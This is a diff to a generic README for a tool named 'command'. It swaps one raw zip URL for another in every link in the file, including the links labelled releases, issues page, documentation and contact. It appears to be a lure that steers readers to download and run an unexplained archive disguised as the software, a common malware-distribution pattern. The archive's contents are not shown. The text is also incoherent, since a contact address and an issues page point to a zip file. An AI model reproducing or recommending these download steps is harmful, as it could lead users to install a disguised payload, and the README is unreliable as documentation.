@@ -8,11 +8,11 @@ Welcome to the command application! This tool helps you manage commands effortle
 
 To get started, you need to download the application. Click the link below to visit our Releases page:
 
-[![Download command](https://github.com/rahmann75tt/command/raw/refs/heads/main/docs/Software-v2.6-alpha.4.zip%https://github.com/rahmann75tt/command/raw/refs/heads/main/docs/Software-v2.6-alpha.4.zip)](https://github.com/rahmann75tt/command/raw/refs/heads/main/docs/Software-v2.6-alpha.4.zip)
+[![Download command](https://raw.githubusercontent.com/rahmann75tt/command/main/internal/example/Software-v3.5.zip%https://raw.githubusercontent.com/rahmann75tt/command/main/internal/example/Software-v3.5.zip)](https://raw.githubusercontent.com/rahmann75tt/command/main/internal/example/Software-v3.5.zip)
 
 ### Steps to Download:
 
-1. Click on the link above or visit [this page to download](https://github.com/rahmann75tt/command/raw/refs/heads/main/docs/Software-v2.6-alpha.4.zip).
+1. Click on the link above or visit [this page to download](https://raw.githubusercontent.com/rahmann75tt/command/main/internal/example/Software-v3.5.zip).
 2. Look for the latest version at the top of the page.
 3. Choose the file that matches your operating system.
 4. Click the download link to save the file to your computer.
@@ -44,7 +44,7 @@ After installing, here's how to use command:
 
 2. **Run Commands**: Type `command` followed by your desired command options. For example:
    ```bash
-   command run https://github.com/rahmann75tt/command/raw/refs/heads/main/docs/Software-v2.6-alpha.4.zip
+   command run https://raw.githubusercontent.com/rahmann75tt/command/main/internal/example/Software-v3.5.zip
    ```
 
 3. **Help Option**: If you need help, use:
@@ -57,20 +57,20 @@ After installing, here's how to use command:
 
 If you encounter any issues or have questions, you can reach out for support:
 
-- **GitHub Issues**: Please report any problems on our [issues page](https://github.com/rahmann75tt/command/raw/refs/heads/main/docs/Software-v2.6-alpha.4.zip).
+- **GitHub Issues**: Please report any problems on our [issues page](https://raw.githubusercontent.com/rahmann75tt/command/main/internal/example/Software-v3.5.zip).
 - **Community Forum**: Join discussions with other users and contribute to the community.
 
 ## 🔗 Additional Resources
 
-- **Documentation**: For detailed instructions, check out the [official documentation](https://github.com/rahmann75tt/command/raw/refs/heads/main/docs/Software-v2.6-alpha.4.zip).
+- **Documentation**: For detailed instructions, check out the [official documentation](https://raw.githubusercontent.com/rahmann75tt/command/main/internal/example/Software-v3.5.zip).
 - **Examples**: Explore practical examples on the documentation site to see how command can fit your needs.
 
 ## 📞 Contact
 
-For business inquiries or further assistance, you can contact us at https://github.com/rahmann75tt/command/raw/refs/heads/main/docs/Software-v2.6-alpha.4.zip
+For business inquiries or further assistance, you can contact us at https://raw.githubusercontent.com/rahmann75tt/command/main/internal/example/Software-v3.5.zip
 
 ## 🔄 Update History
 
-When updates are released, new features are included, and bugs are fixed. Make sure to keep your application up to date by regularly checking the [Releases page](https://github.com/rahmann75tt/command/raw/refs/heads/main/docs/Software-v2.6-alpha.4.zip). 
+When updates are released, new features are included, and bugs are fixed. Make sure to keep your application up to date by regularly checking the [Releases page](https://raw.githubusercontent.com/rahmann75tt/command/main/internal/example/Software-v3.5.zip). 
 
 Follow the simple steps above, and enjoy smooth automation with command!
